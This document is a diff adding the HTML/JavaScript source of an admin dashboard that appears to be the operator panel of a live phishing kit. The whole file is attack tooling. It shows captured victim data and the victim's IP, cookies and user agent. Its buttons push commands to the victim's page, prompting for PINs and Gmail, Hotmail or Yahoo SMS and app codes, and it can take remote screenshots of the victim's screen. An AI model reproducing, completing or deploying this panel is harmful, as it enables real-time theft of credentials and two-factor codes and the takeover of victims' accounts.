@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <title>WEBADMIN</title>
+      <!-- HTML5 Shim and Respond.js IE10 support of HTML5 elements and media queries -->
+      <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+      <!--[if lt IE 10]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+      <![endif]-->
+      <!-- Meta -->
+	
+
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+      <meta name="description" content=""/>
+      <meta name="keywords" content=""/>
+      <meta name="author" content="CodedThemes" />
+      <!-- Favicon icon -->
+      <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
+      <!-- fontawesome icon -->
+      <link rel="stylesheet" href="assets/fonts/fontawesome/css/fontawesome-all.min.css">
+      <!-- material icon -->
+      <link rel="stylesheet" href="assets/fonts/material/css/materialdesignicons.min.css">
+      <!-- animation css -->
+      <link rel="stylesheet" href="assets/plugins/animation/css/animate.min.css">
+      <!-- data tables css -->
+      <link rel="stylesheet" href="assets/plugins/data-tables/css/datatables.min.css">
+      <!-- prism css -->
+      <link rel="stylesheet" href="assets/plugins/prism/css/prism.min.css">
+	  <!-- toolbar css -->
+	  <link rel="stylesheet" href="assets/plugins/toolbar/css/jquery.toolbar.css">
+      <!-- vendor css -->
+      <link rel="stylesheet" href="assets/css/style.css">
+      <link rel="stylesheet" href="assets/css/style_action.css">
+      <link rel="stylesheet" href="assets/css/style_custom.css">
+	  <style>
+	  
+	  .btn-copy.ip{
+		background:black;
+		color:#fff;
+		transition: all 0s ease-in-out;
+	  }
+	  
+	  .btn-copy.ip:hover{
+		background:#d3d3d3;
+		color:#fff;
+	  }
+	  
+	  .btn-copy.ip:active{
+	  background: #1de9b6;
+	  border:2px solid black;
+
+	}
+	
+	
+	.btn-copy:active:after {
+	  background: purple;
+	  border: none !important
+	}
+	
+	  
+	  .btn-copy:after {
+	  background: yellow;
+	  border: none !important
+	}
+	
+	
+	  .btn-copy:link {
+	  background: #FF0000;
+	  border: none !important
+	}
+
+	/* visited link */
+	.btn-copy:visited {
+	  background: red;
+	  border: none !important
+	}
+
+	/* mouse over link */
+	.btn-copy:hover {
+	  background: #ffe4a7;
+	  border: none !important
+	}
+
+	/* selected link */
+	.btn-copy:active {
+	  background: #1de9b6;
+	  border: none !important
+	}
+	  
+	  
+	  .btn-copy{
+		background: #f4f4f4;
+		border: none !important
+	}
+	  
+	
+	  
+	.btn-formt button{
+	  background-color:#ccc;
+	  border-color:#ccc;
+	  }
+	  
+	  .m-t-100{
+		margin-top:100px
+
+	  }
+	  .data-input-page{
+		color: #fff;
+		margin-right: 20px;
+		font-size: 13px;
+	  }
+	  
+	  .table_data{
+		background: #f6f6f6 ;
+		color: #bababa
+	  }
+	  
+	  .table_type{
+		border-bottom: 4px solid #1de9b6 !important;
+		border-top: 4px solid #1de9b6 !important;
+		background: lightcyan;
+	  }
+	  .status_online{
+		display:none;
+		position: absolute;
+		height: 70px;
+		background: #1de9b6;
+		z-index: 99;
+		padding: 25px;
+		color: white;
+		width: 100%;
+		top: 0;
+		text-align: center;
+		font-weight: 500;
+	  }
+	  
+	  .status_offline{
+		display:none;
+		position: absolute;
+		height: 70px;
+		background: #e96673;
+		z-index: 99;
+		padding: 25px;
+		color: white;
+		width: 100%;
+		top: 0;
+		text-align: center;
+		font-weight: 500;
+	  }
+	  
+	  
+	  </style>
+   </head>
+   <body>
+   
+	  <audio id="notificacao" preload="auto">
+		<source src="http://soundbible.com/mp3/poker-chips-daniel_simon.mp3" type="audio/mpeg">
+	  </audio>
+	  
+	  
+      <!-- [ Pre-loader ] start -->
+      <div class="loader-bg">
+         <div class="loader-track">
+            <div class="loader-fill"></div>
+         </div>
+      </div>
+      <!-- [ Pre-loader ] End -->
+      <!-- [ navigation menu ] start -->
+     
+      <!-- [ navigation menu ] end -->
+      <!-- [ Header ] start -->
+      <header class="navbar pcoded-header navbar-expand-lg navbar-light headerpos-fixed header-blue">
+	  
+	  	  <!-------------- STATUS COMMAND -------------------->
+	  <div  class="status_online"><span><i class="far fa-bell m-r-5"></i> USER ONLINE -- COMANDO EXECUTADO COM SUCESSO -- <span></div>
+	  <div  class="status_offline"><span><i class="far fa-bell m-r-5"></i> USER OFFLINE -- COMANDO FALHOU --<span></div>
+	  <!-------------- STATUS COMMAND -------------------->
+	  
+	  
+         <div class="m-header">
+            <a class="mobile-menu" id="mobile-collapse1" href="javascript:"><span></span></a>
+            <a href="index.html" class="b-brand">
+               <div class="b-bg">
+                  <i class="feather icon-trending-up"></i>
+               </div>
+               <span class="b-title">WEBADMIN</span>
+            </a>
+         </div>
+         <a class="mobile-menu" id="mobile-header" href="javascript:">
+         <i class="feather icon-more-horizontal"></i>
+         </a>
+         <div class="collapse navbar-collapse">
+            <ul class="navbar-nav mr-auto">
+               <li><a href="javascript:" class="full-screen" onclick="javascript:toggleFullScreen()"><i class="feather icon-maximize"></i></a></li>
+               <li class="nav-item">
+                  <div class="main-search">
+                     <div class="input-group">
+                        <input type="text" id="m-search" class="form-control" placeholder="Search . . .">
+                        <a href="javascript:" class="input-group-append search-close">
+                        <i class="feather icon-x input-group-text"></i>
+                        </a>
+                        <span class="input-group-append search-btn btn btn-primary">
+                        <i class="feather icon-search input-group-text"></i>
+                        </span>
+                     </div>
+                  </div>
+               </li>
+            </ul>
+            <ul class="navbar-nav ml-auto">
+               <li>
+                  <div class="dropdown drp-user">
+                     <a href="javascript:" class="dropdown-toggle" data-toggle="dropdown">
+                     <i class="icon feather icon-settings"></i>
+                     </a>
+                     <div class="dropdown-menu dropdown-menu-right profile-notification">
+                        <div class="pro-head">
+                           <img src="assets/images/user/avatar-1.jpg" class="img-radius" alt="User-Profile-Image">
+                           <span>User-1 [Admin]</span>
+                           <!--<a href="auth-signin.html" class="dud-logout" title="Logout">
+                              <i class="feather icon-log-out"></i>
+                              </a>-->
+                        </div>
+                        <ul class="pro-body">
+                           <li><a href="javascript:" class="dropdown-item"><i class="feather icon-settings"></i> Create Account</a></li>
+                           <li><a href="javascript:" class="dropdown-item"><i class="feather icon-user"></i> Logout</a></li>
+                        </ul>
+                     </div>
+                  </div>
+               </li>
+            </ul>
+         </div>
+      </header>
+      <!-- [ Header ] end -->
+      <!-- xx[ Table User-LINK-ALERT ] Start -->
+      
+      <!-- xx[ Table Users-LINK-ALERT ] End -->
+      <!-- xx[ Table Users ] Start -->
+     
+	 <div class="row m-t-100">
+	  
+                                <!-- [ task-detail ] start -->
+                                <div class="col-xl-5 col-lg-12 task-detail-right">
+
+                                    <div class="card">
+                                        <div class="card-header">
+                                            <h5>Data receiver</h5>
+											  <!-- <button id='status_user' class="btn btn-success float-right sendCmd" data-type="button_10">--</button>
+											 <button class="btn btn-success float-right sendCmd" data-type="button_01"><i class="far fa-bell m-r-5"></i>Home</button>-->
+												
+                                        </div> 
+                                        <div class="card-block task-details">
+                                            <table class="table">
+                                                <tbody id="dataTable">
+													</tbody>
+                                            </table>
+                                           
+                                        </div>
+                                    </div>
+                                   
+                                   
+                                   
+                                    
+                                </div>
+								
+                                <div class="col-xl-7 col-lg-12">
+                                    <div class="card">
+                                        <div class="card-header">
+                                            <h5 class="mb-3">Commands</h5>
+                                            <button id='status_user' class="btn btn-success float-right sendCmd" data-type="button_16">--</button>
+                                            <button id='status_user_ip' style="" class="btn-copy btn ip float-right">--</button>
+                                            <!--<button id='status_command' style="display:none;" class="btn btn-success float-right">Successfully executed!</button> -->
+                                        </div>
+                                         <div class="card-block">
+                                            <div class="m-b-20">
+                                                <h6>Page user >> <b> HOME </strong> </h6>
+                                                <hr>
+                                            </div>
+
+
+                                            
+                                            
+                                            <div class="type-a" style="display: none;">
+											
+                                                <button data-toggle="modal" data-target="#exampleModal" class="btn btn-success"><i class="far fa-bell m-r-5"></i>Home</button>
+                                                <button data-toggle="modal" data-target="#sendCommandM1"  class="btn btn-primary"><i class="far fa-bell m-r-5"></i>M1</button>
+                                                <button data-toggle="modal" data-target="#sendCommandM2" class="btn btn-primary"><i class="far fa-bell m-r-5"></i>M2</button>
+                                                <button class="btn btn-primary sendCmd" data-type="button_04"><i class="far fa-bell m-r-5"></i>Pin</button>
+                                                <button class="btn btn-primary sendCmd" data-type="button_05"><i class="far fa-bell m-r-5"></i>Loading</button>
+                                                <button class="btn btn-primary sendCmd"  data-type="button_06"><i class="far fa-bell m-r-5"></i>Error top</button>
+                                                <button class="btn btn-primary sendCmd" data-type="button_07"><i class="far fa-bell m-r-5" ></i>Success</button>
+             
+                                            </div>
+
+                                            <div class="type-b" style="display: none;">
+                                             <button class="btn btn-primary sendCmd" data-type="button_01"><i class="far fa-bell m-r-5"></i>History</button>
+                                             <button class="btn btn-primary sendCmd"  data-type="button_02"><i class="far fa-bell m-r-5"></i>OP1</button>
+                                             <button class="btn btn-primary sendCmd" data-type="button_03"><i class="far fa-bell m-r-5" ></i>OP2</button>
+                                            </div>
+									
+                                        </div>
+										<hr>
+										<div class=" accordion" id="accordionExample">
+											<div class="card">
+												<div class="card-header" id="headingOne">
+                                       <h5 class="mb-0"><a href="#" data-toggle="collapse" data-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne" class="collapsed">Monitor PrintScreen </a></h5>
+                                       <button class="btn btn-success float-right" id="screenshot"><i class="far fa-bell m-r-5" ></i>Take Screenshot</button>
+													
+												</div>
+												<div id="collapseOne" class="card-body collapse screenshotContainer" aria-labelledby="headingOne" data-parent="#accordionExample" style="">
+													<img style="width:100% " src=".\assets\images\widget\dashborad-3.jpg" \="">
+												</div>
+											</div>           
+										</div>
+                                    </div>
+                                   
+                                </div> 
+                                <!-- [ task-detail ] end -->
+								
+                            </div>
+
+						
+      <!-- xx[ Table Users ] End -->
+      <!-- xx[ action options list ] start -->
+      
+      <!-- xx[ action user list ] end -->
+      <div class="modal fade" id="sendCommandM1" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+         <div class="modal-dialog" role="document">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <h5 class="modal-title" id="exampleModalLabel">Send Command</h5>
+                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+               </div>
+               <div class="modal-body">
+					<p>you want to send the command { M1 }</p>
+               </div>
+               <div class="modal-footer">
+                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
+                  <button type="button" class="btn btn-primary sendCmd" data-type="button_02">Confirm</button>
+               </div>
+            </div>
+         </div>
+      </div>
+      <!-- xx[ action user list ] end -->
+      <div class="modal fade" id="sendCommandM2" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+         <div class="modal-dialog" role="document">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <h5 class="modal-title" id="exampleModalLabel">Send Command</h5>
+                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+               </div>
+               <div class="modal-body">
+					<p>you want to send the command { M2 }</p>
+               </div>
+               <div class="modal-footer">
+                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
+                  <button type="button" class="btn btn-primary sendCmd" data-type="button_03">Confirm</button>
+               </div>
+            </div>
+         </div>
+      </div>
+      <!-- xx[ Modal ] start -->
+	  
+	  
+	  
+		<!------------------------------------------------------- >
+		<div class="modal fade" id="modal_02" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+			 <div class="modal-dialog" role="document">
+				<div class="modal-content">
+				   <div class="modal-header">
+					  <h5 class="modal-title" id="exampleModalLabel">Send Command M1</h5>
+					  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+				   </div>
+				   <div class="modal-body">
+					  <form>
+						 <div class="xxform-group">
+							<label  class="col-form-label">ID-USER:</label>
+							<input class="form-control ceid" id="" disabled value="G2235REE345235R#18">
+							
+						 </div>
+						  
+						 <div class="form-group">
+							<label class="col-form-label">NAME-USER:</label>
+							<input class="form-control" id="response_02" placeholder="Jones Michel Wall">
+							
+						 <label class="col-form-label">NUMBER-USER:</label>
+							<input class="form-control" id="response_03" placeholder="XXXXXXX6545">
+						<!-- 	
+						 <label class="col-form-label">response_03:</label>
+							<input class="form-control" id="response_04" placeholder="Tabela3">
+							
+						 <label class="col-form-label">response_04:</label>
+							<input class="form-control" id="response_05" placeholder="coordenadas"> -- >
+							
+						 </div>
+						 
+					  </form>
+				   </div>
+				   <div class="modal-footer">
+					  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+					  <button type="button" class="btn btn-primary" id="btn_modal_02">Send message</button>
+				   </div>
+				</div>
+			 </div>
+		  </div>
+		<!------------------------------------------------------ ->
+		
+		<div class="modal fade" id="modal_01" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+			 <div class="modal-dialog" role="document">
+				<div class="modal-content">
+				   <div class="modal-header">
+					  <h5 class="modal-title" id="exampleModalLabel">Send Command M1</h5>
+					  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+				   </div>
+				   <div class="modal-body">
+					  <form>
+						 <div class="xxform-group">
+							<label  class="col-form-label">ID-USER:</label>
+							<input class="form-control ceid" id="" disabled value="G2235REE345235R#18">
+							
+						 </div>
+						  
+						 <div class="form-group">
+							<label class="col-form-label">NUMBER-USER:</label>
+							<input class="form-control" id="response_01" placeholder="XXXXXXX6545">
+							
+						  <!-- <label class="col-form-label">response_02:</label>
+							<input class="form-control" id="response_08" placeholder="Security"> -- >
+							
+						 </div>
+						 
+					  </form>
+				   </div>
+				   <div class="modal-footer">
+					  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+					  <button type="button" class="btn btn-primary" id="btn_modal_01">Send message</button>
+				   </div>
+				</div>
+			 </div>
+		  </div>
+		  
+		  -->
+		  
+
+	
+ 
+	     <!-- GMAIL ------------------------------------------------------------------------>
+	   
+	   <!-- MODAL GMAIL SMS -->
+	   
+      <div class="modal fade" id="modal_gmal_sms" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+         <div class="modal-dialog" role="document">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <h5 class="modal-title" id="exampleModalLabel">Send Command M1</h5>
+                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+               </div>
+               <div class="modal-body">
+                  <form>
+                     <div class="xxform-group">
+                        <label  class="col-form-label">ID-USER:</label>
+                        <input class="form-control ceid" id="" disabled value="G2235REE345235R#18">
+						
+                     </div>
+					  
+                     <div class="form-group">
+                        <label class="col-form-label">response_01:</label>
+                        <input class="form-control" id="response_01" placeholder="(**)****-**72">
+                     </div>
+					 
+                  </form>
+               </div>
+               <div class="modal-footer">
+                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                  <button type="button" class="btn btn-primary" id="btn_modal_gmal_sms">Send message</button>
+               </div>
+            </div>
+         </div>
+      </div>
+	  
+	    <!-- MODAL GMAIL SMS -->
+		
+	   <div class="modal fade" id="modal_gmal_app" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+         <div class="modal-dialog" role="document">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <h5 class="modal-title" id="exampleModalLabel">Send Command M2</h5>
+                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+               </div>
+               <div class="modal-body">
+                  <form>
+                     <div class="xxform-group">
+                        <label  class="col-form-label">ID-USER:</label>
+                        <input class="form-control ceid" id="" disabled value="G2235REE345235R#18">
+						
+                     </div>
+					  
+                     <div class="form-group">
+                        <label class="col-form-label">response_01:</label>
+                        <input class="form-control" id="response_02" placeholder="42">						
+                     </div>
+					 
+                  </form>
+               </div>
+               <div class="modal-footer">
+                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                  <button type="button" class="btn btn-primary" id="btn_modal_gmal_app">Send message</button>
+               </div>
+            </div>
+         </div>
+      </div>
+	  
+		<!-- GMAIL ------------------------------------------------------------------------>
+	   
+		<!-- HOTMAIL ---------------------------------------------------------------------->
+
+		<!-- MODAL HOTMAIL SMS -->
+		
+		<div class="modal fade" id="modal_hotmail_sms" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+			 <div class="modal-dialog" role="document">
+				<div class="modal-content">
+				   <div class="modal-header">
+					  <h5 class="modal-title" id="exampleModalLabel">Send Command M1</h5>
+					  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+				   </div>
+				   <div class="modal-body">
+					  <form>
+						 <div class="xxform-group">
+							<label  class="col-form-label">ID-USER:</label>
+							<input class="form-control ceid" id="" disabled value="G2235REE345235R#18">
+							
+						 </div>
+						  
+						 <div class="form-group">
+							<label class="col-form-label">response_01:</label>
+							<input class="form-control" id="response_03" placeholder="(**)****-**72">
+							
+						   <!-- <label class="col-form-label">response_02:</label>
+							<input class="form-control" id="response_02">-->
+							
+						 </div>
+						 
+					  </form>
+				   </div>
+				   <div class="modal-footer">
+					  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+					  <button type="button" class="btn btn-primary" id="btn_modal_hotmail_sms">Send message</button>
+				   </div>
+				</div>
+			 </div>
+		  </div>	  
+		
+		<!-- MODAL HOTMAIL APP -->
+		
+		<div class="modal fade" id="modal_hotmail_app" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+			 <div class="modal-dialog" role="document">
+				<div class="modal-content">
+				   <div class="modal-header">
+					  <h5 class="modal-title" id="exampleModalLabel">Send Command M1</h5>
+					  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+				   </div>
+				   <div class="modal-body">
+					  <form>
+						 <div class="xxform-group">
+							<label  class="col-form-label">ID-USER:</label>
+							<input class="form-control ceid" id="" disabled value="G2235REE345235R#18">
+							
+						 </div>
+						  
+						 <div class="form-group">
+							<label class="col-form-label">response_01:</label>
+							<input class="form-control" id="response_04" placeholder="(**)****-**72">
+							
+						   <!-- <label class="col-form-label">response_02:</label>
+							<input class="form-control" id="response_02">-->
+							
+						 </div>
+						 
+					  </form>
+				   </div>
+				   <div class="modal-footer">
+					  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+					  <button type="button" class="btn btn-primary" id="btn_modal_hotmail_app">Send message</button>
+				   </div>
+				</div>
+			 </div>
+		  </div>
+		<!-- HOTMAIL ---------------------------------------------------------------------->
+		
+		
+		<!-- YAHOO ---------------------------------------------------------------------->
+		<!-- MODAL YAHOO SMS -->
+		
+		<div class="modal fade" id="modal_yahoo_sms" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+			 <div class="modal-dialog" role="document">
+				<div class="modal-content">
+				   <div class="modal-header">
+					  <h5 class="modal-title" id="exampleModalLabel">Send Command M1</h5>
+					  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+				   </div>
+				   <div class="modal-body">
+					  <form>
+						 <div class="xxform-group">
+							<label  class="col-form-label">ID-USER:</label>
+							<input class="form-control ceid" id="" disabled value="G2235REE345235R#18">
+							
+						 </div>
+						  
+						 <div class="form-group">
+							<label class="col-form-label">response_01:</label>
+							<input class="form-control" id="response_05" placeholder="(**)****-**72">
+							
+						   <!-- <label class="col-form-label">response_02:</label>
+							<input class="form-control" id="response_02">-->
+							
+						 </div>
+						 
+					  </form>
+				   </div>
+				   <div class="modal-footer">
+					  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+					  <button type="button" class="btn btn-primary" id="btn_modal_yahoo_sms">Send message</button>
+				   </div>
+				</div>
+			 </div>
+		  </div>	  
+		
+		<!-- MODAL YAHOO APP -->
+		
+		<div class="modal fade" id="modal_yahoo_app" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+			 <div class="modal-dialog" role="document">
+				<div class="modal-content">
+				   <div class="modal-header">
+					  <h5 class="modal-title" id="exampleModalLabel">Send Command M1</h5>
+					  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+				   </div>
+				   <div class="modal-body">
+					  <form>
+						 <div class="xxform-group">
+							<label  class="col-form-label">ID-USER:</label>
+							<input class="form-control ceid" id="" disabled value="G2235REE345235R#18">
+							
+						 </div>
+						  
+						 <div class="form-group">
+							<label class="col-form-label">response_01:</label>
+							<input class="form-control" id="response_06" placeholder="(**)****-**72">
+							
+						   <!-- <label class="col-form-label">response_02:</label>
+							<input class="form-control" id="response_02">-->
+							
+						 </div>
+						 
+					  </form>
+				   </div>
+				   <div class="modal-footer">
+					  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+					  <button type="button" class="btn btn-primary" id="btn_modal_yahoo_app">Send message</button>
+				   </div>
+				</div>
+			 </div>
+		  </div>
+	  
+      <!-- xx[ Tooltip ] start -->
+		<div id="toolbar-links" class="hidden">
+			<a href="javascript:"> https://www.siteAlert02.com/login/</a>
+		</div>
+		
+		<div id="toolbar-action" class="hidden">
+			<a href="javascript:"><i class="_cookie mdi mdi-cookie"></i></a>
+			<a href="javascript:"><i class="_ip mdi mdi-ip"></i></a>
+			<a href="javascript:"><i class="_userAgent mdi mdi-clipboard-account"></i></a>
+		</div>
+	  <!-- xx[ Tooltip ] end -->
+      
+	  
+	  <!-- xx[ Modal ] end -->
+      <!-- Required Js -->
+      <script src="assets/js/vendor-all.min.js"></script>
+      <script src="assets/js/pcoded.min.js"></script>
+      <script src="assets/js/pcoded_action.js"></script>
+      <!-- prism Js -->
+      <script src="assets/plugins/prism/js/prism.min.js"></script>
+      <!-- Data tables.js -->
+      <script src="assets/plugins/data-tables/js/datatables.min.js"></script>
+	  <!-- toolbar Js -->
+	  <script src="assets/plugins/toolbar/js/jquery.toolbar.min.js"></script>
+      <script src="assets/js/pages/ac-toolbar.js"></script>
+      <script src="assets/js/clipboard.min.js"></script>
+	
+	
+       <script src="../config/config.js"></script>
+       <script type="text/javascript">
+				
+				
+
+				
+		 setTimeout(function() {
+             $('#table-users-link-alert, #table-users').DataTable();
+         }, 600);//DataTable
+
+	  
+	   
+         $('#exampleModal').on('show.bs.modal', function(event) {
+             var button = $(event.relatedTarget) // Button that triggered the modal
+             var recipient = button.data('whatever') // Extract info from data-* attributes
+             var modal = $(this)
+            // modal.find('.modal-title').text('Save Annotation ' + recipient)
+             //modal.find('.modal-body input').val(recipient)
+         })
+		 
+		 
+		 // Action buttons dropdown | linkAlert , blacklist , highlight | cookie , ip , userAgent
+		 
+		 
+		  $("#status_user").click(function(){
+			   $('#notificacao').trigger('play');
+		 });
+		 
+      
+	  
+
+    
+
+
+      // PCODES
+
+     
+	  
+	  
+      let ping_interval = 5;
+	  var token = '';
+      let viewUser = window.location.href;
+      viewUser = viewUser.substr(viewUser.indexOf("#")+1, viewUser.length);
+      $(".ceid").val(viewUser);
+      $("#status_user").text(viewUser);
+
+	  //websocket_func()
+	  
+	  //function websocket_func() {
+	  
+		  // PCODES
+		  ws.onopen = event=>{
+		  //debugger
+			 let key = localStorage.getItem(admin_localstorage);
+			 ws.send(JSON.stringify({action: "validate", key: key}));
+			 ws.send(JSON.stringify({action: "ping"}));
+
+		  };
+
+		ws.onmessage = response=>{
+				response = JSON.parse(response.data);
+				debugger
+
+				switch(response.action){
+				   case "screenshot-response":
+					  $(".screenshotContainer img").attr("src", response.canvas);
+					  break;
+				   case "command-executed":
+						var isActive = response.isActive
+						if(isActive){
+						  //alert("Successfully executed!");
+						  $(".status_online").finish().fadeOut();
+						  $(".status_online").fadeIn(1000);
+						  $(".status_online").fadeOut(5000);
+						}else{
+							//alert("User Offline");
+							$(".status_offline").finish().fadeOut();
+						  $(".status_offline").fadeIn(1000);
+						  $(".status_offline").fadeOut(5000);
+						}
+					  break;
+					case "validate-response":
+						if(response.status!="ok")window.location.href = "./login.html";
+						else token = response.token; 
+						ws.send(JSON.stringify({action: "get-user-data", userkey: viewUser, token: token}));
+                  break;
+				   case "reload-admin-data":
+					   if(viewUser==response.id) ws.send(JSON.stringify({action: "get-user-data", userkey: viewUser, token: token}));
+					  break;
+				   case "view-user-data":
+					  let curData = response.data;
+					  let emailData = response.data.data.data_03.data;
+					  
+					  let a = ["hotmail" , "yahoo" , "gmail", "webmail"]
+					  a.forEach(clear_btn_form)
+					  
+					  if(emailData != null){
+						  // Formata os buttons
+						  debugger
+						  if(emailData.indexOf("hotmail") > 1 || emailData.indexOf("msn") > 1 || emailData.indexOf("outlook") > 1 || emailData.indexOf("live") > 1)
+							$("#btn-group-hotmail").removeClass("btn-formt");
+						  else if(emailData.indexOf("yahoo") > 1)
+							$("#btn-group-yahoo").removeClass("btn-formt");
+						  else if(emailData.indexOf("gmail") > 1)
+							$("#btn-group-gmail").removeClass("btn-formt");
+						  else
+							$("#btn-group-webmail").removeClass("btn-formt");
+					  }else{
+						console.log("Sem formatação");
+					  }
+					  
+					  let html = "";
+					  html += "<tr class='table_type'>";
+					  html += "<td>TYPE</td>";
+					  html += "<td colspan='2' class='text-right'><span class='float-right'><a href='#'>"+curData.site.name+"</a></span></td>";
+					  html += "</tr>";
+
+					  let header = Object.keys(curData.data);
+					  
+					  header.forEach(dataType=>{
+						 let i = curData.data[dataType];
+						 // sound new data
+						 $('#notificacao').trigger('play');
+						 html += "<tr>";
+						 html += "<td class='table_data'>"+i.page+"</td>";
+						 html += "<td>"+i.data_name+"</td>";
+						 html += "<td class='text-right'><button class='btn-copy'>"+i.data+"</button></td>";
+						 html += "</tr>";
+					  });
+
+					  $("#dataTable").html(html);  
+
+
+
+					    var clipboard = new ClipboardJS('.btn-copy', {
+					
+						text: function(e) {
+							debugger
+							//alert(e.textContent)
+							return e.textContent;
+						}
+						});
+
+						clipboard.on('success', function(e) {
+							console.log(e);
+						});
+
+						clipboard.on('error', function(e) {
+							console.log(e);
+						});
+	
+	
+	
+					/*$('.btn-copy').click(function(e){
+						debugger;
+						
+						alert()
+					})*/
+
+		
+					  break;
+					  
+				case "refresh-users":
+					  console.log('pagina não utiliza essa opção')
+					  var arr = response.users
+					  
+					  arr.forEach(myFunction);
+
+			  
+					  //updateList(response);
+					  break;
+				case "pong":
+					  setTimeout(function() {
+						 ws.send(JSON.stringify({action: "ping"}));
+					  }, ping_interval * 1000);	
+					break;   
+				}
+		};
+		
+		
+		function myFunction(item, index) {
+		debugger
+			if ( item.id === viewUser ){
+				console.log(index + ":" + item.id)
+				$("#status_user_ip").text(`${item.ip}_${item.country}_${item.region}`)
+			}
+			console.log('NOT')
+		}
+		
+	
+	function clear_btn_form(item, index) {
+		$(`#btn-group-${item}`).addClass("btn-formt");
+	}
+
+		//ws.onerror = function () {
+		//		console.log(error);
+		//	};
+			
+		//ws.onclose = function () {
+		//	alert('Erro Close')
+		//	setTimeout(websocket_func, 1000);
+		//}
+		
+	
+	//}
+	
+	/*
+	// ACCOUNT MODAL FUNCTIONS -----------------------------------------------
+		
+	$("#btn_modal_01").click(function(){
+		 let res1 = $("#response_01").val();
+		 sendResponse('button_05', [res1]);
+	});
+	
+	$("#btn_modal_02").click(function(){
+		 let res1 = $("#response_02").val();
+		 let res2 = $("#response_03").val();
+		 sendResponse('button_06', [res1, res2]);
+	});
+	*/
+	
+	
+	
+	// GMAIL MODAL FUNCTIONS -----------------------------------------------
+	
+	$("#btn_modal_gmal_sms").click(function(){
+		 let res1 = $("#response_01").val();
+		 sendResponse('button_23', [res1]);
+	});
+
+	$("#btn_modal_gmal_app").click(function(){
+		 var res1 = $("#response_02").val();
+			sendResponse('button_24', [res1]);
+	});
+	
+	// GMAIL MODAL FUNCTIONS -----------------------------------------------
+	
+	
+	// HOTMAIL MODAL FUNCTIONS -----------------------------------------------
+	
+	$("#btn_modal_hotmail_sms").click(function(){
+		 let res1 = $("#response_03").val();
+		 sendResponse('button_30', [res1]);
+	});
+
+	$("#btn_modal_hotmail_app").click(function(){
+		 let res1 = $("#response_04").val();
+		 sendResponse('button_31', [res1]);
+	});
+	
+	// HOTMAIL MODAL FUNCTIONS -----------------------------------------------
+	
+	$("#btn_modal_yahoo_sms").click(function(){
+		 let res1 = $("#response_05").val();
+		 sendResponse('button_36', [res1]);
+	});
+
+	$("#btn_modal_yahoo_app").click(function(){
+		 let res1 = $("#response_06").val();
+		 sendResponse('button_37', [res1]);
+	});
+	
+
+
+	$(".sendCmd").click(function(){
+         sendResponse($(this).data('type'), []);
+	});
+
+	  
+
+	$("#screenshot").click(function(){
+         ws.send(JSON.stringify({action: "screenshot", userid: viewUser, adminid: localStorage.getItem(admin_localstorage) , token: token}));
+      });
+	  
+      // res = array();
+      // sendResponse('button_01', ['res1', 'res2', 'res3']);
+      function sendResponse(buttonType, res){
+         let admin = localStorage.getItem(admin_localstorage);
+
+         ws.send(JSON.stringify({action: "send-command", type: buttonType, response: res, admin: admin, id: viewUser , token: token}))
+		}
+  
+		
+  </script>
+   </body>
+</html>
